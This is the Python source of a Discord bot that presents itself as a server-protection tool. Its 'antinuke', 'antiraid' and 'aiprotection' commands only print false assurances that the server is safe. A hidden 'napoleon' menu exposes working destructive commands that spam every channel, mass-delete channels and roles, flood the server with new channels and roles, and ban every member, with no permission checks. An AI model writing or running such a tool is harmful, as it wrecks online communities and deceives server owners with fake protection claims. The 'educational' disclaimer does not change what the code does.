import discord
import colorama
from colorama import Fore
from discord.ext import commands

# Initialize colorama
colorama.init()

# Bot configuration
intents = discord.Intents.all()
intents.message_content = True
prefix = 'n.'
bot = commands.Bot(command_prefix=prefix, intents=intents)

def get_bot_token():
    """Get bot token from user input"""
    return input(Fore.CYAN + "Bot token: ")

@bot.event
async def on_ready():
    """Event triggered when bot is ready"""
    print(Fore.LIGHTMAGENTA_EX + f'''
                                                                                                  
This App is designed for educational purposes       
Please don't be a dick and abuse my creativity       
Beta v1 Divinity Gaming Productions LLC.                 
Hi Tarfex, HI o98. Hi Trust                                                                                                                                                                                           
Created By: Joe (Tenkichi/SR Team)          
BOT IS READY AS {bot.user}     
    ''')

@bot.command()
async def menu(ctx):
    """Display available commands menu"""
    embed = discord.Embed(
        title='COMMANDS',
        description='''Anti-nuke = n.antinuke
Anti-raid = n.antiraid
AI-protection = n.aiprotection''',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)

@bot.command()
async def antinuke(ctx):
    """Anti-nuke protection command (placeholder)"""
    embed = discord.Embed(
        title='ANTI-NUKE PROTECTION',
        description='Your server is now safe and protected',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)

@bot.command()
async def antiraid(ctx):
    """Anti-raid protection command (placeholder)"""
    embed = discord.Embed(
        title='ANTI-RAID PROTECTION',
        description='Your server is now safe and protected',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)

@bot.command()
async def aiprotection(ctx):
    """AI protection command (placeholder)"""
    embed = discord.Embed(
        title='AI-PROTECTION WAS ACTIVATED',
        description='Your server is now safe and protected',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)

@bot.command()
async def napoleon(ctx):
    """Display destructive commands (WARNING: These can harm servers)"""
    embed = discord.Embed(
        title='NAPOLEON COMMANDS',
        description='''Spam to all channels = n.spam (message) (number like 1000) so for example n.spam @everyone nuked 1000
Create channels = n.spamchannels (name of channels) (how many channels will be created like 100) for example n.spamchannels nuked 100
Delete channels = n.deletechannels (number of channels that will be deleted for example like n.deletechannels 100)
Create roles = n.spamroles (name of role that will be created) (how many roles will be created) so for example n.spamroles nuked 100
Delete roles = n.deleteroles (number of roles that will be deleted for example n.deleteroles 20)
Ban all members = n.massban

# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON''',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)

@bot.command()
async def spam(ctx, *, args):
    """Spam messages to all channels (WARNING: Destructive)"""
    try:
        message, amount = args.rsplit(' ', 1)
        amount = int(amount)
    except ValueError:
        return await ctx.send("Error. Use it like: n.spam <message> <amount>")
    
    if amount <= 0:
        return await ctx.send("Amount must be positive")
    
    if amount > 1000:  # Add reasonable limit
        return await ctx.send("Amount too high, maximum is 1000")
    
    channels = ctx.guild.text_channels
    try:
        for i in range(amount):
            for channel in channels:
                await channel.send(message)
    except discord.HTTPException as e:
        await ctx.send(f"Error occurred: {e}")

@bot.command()
async def spamchannels(ctx, name: str, amount: int):
    """Create multiple channels (WARNING: Can clutter server)"""
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be between 1 and 100")
    
    try:
        for i in range(amount):
            await ctx.guild.create_text_channel(f"{name}-{i}")
        await ctx.send(f"Created {amount} channels")
    except discord.HTTPException as e:
        await ctx.send(f"Error creating channels: {e}")

@bot.command()
async def deletechannels(ctx, amount: int):
    """Delete multiple channels (WARNING: Destructive)"""
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be between 1 and 100")
    
    channels = ctx.guild.text_channels
    count = 0
    
    try:
        for channel in channels:
            if count < amount:
                await channel.delete()
                count += 1
        await ctx.send(f"Deleted {count} channels")
    except discord.HTTPException as e:
        await ctx.send(f"Error deleting channels: {e}")

@bot.command()
async def spamroles(ctx, name: str, amount: int):
    """Create multiple roles (WARNING: Can clutter server)"""
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be between 1 and 100")
    
    guild = ctx.guild
    created = 0
    
    try:
        for i in range(amount):
            await guild.create_role(name=f"{name}-{i}")
            created += 1
        await ctx.send(f"Created {created} roles")
    except discord.HTTPException as e:
        await ctx.send(f"Error creating roles: {e}")

@bot.command()
async def deleteroles(ctx, amount: int):
    """Delete multiple roles (WARNING: Destructive)"""
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be between 1 and 100")
    
    guild = ctx.guild
    roles = guild.roles
    count = 0
    skipped = 0
    
    for role in roles:
        if count < amount:
            try:
                await role.delete()
                count += 1
            except discord.HTTPException:
                skipped += 1
    
    await ctx.send(f"Deleted {count} roles, skipped {skipped}")

@bot.command()
async def massban(ctx):
    """Ban all members (WARNING: Extremely destructive)"""
    guild = ctx.guild
    members = guild.members
    count = 0
    skipped = 0
    
    for member in members:
        try:
            if member != ctx.author and member != bot.user:  # Don't ban the command author or bot
                await member.ban(reason="Mass ban command")
                count += 1
        except discord.Forbidden:
            skipped += 1
    
    await ctx.send(f"Banned {count} members, skipped {skipped}")

def main():
    """Main function to run the bot"""
    token = get_bot_token()
    try:
        bot.run(token)
    except discord.LoginFailure:
        print(Fore.RED + "Invalid bot token!")
    except Exception as e:
        print(Fore.RED + f"Error running bot: {e}")

if __name__ == "__main__":
    main()
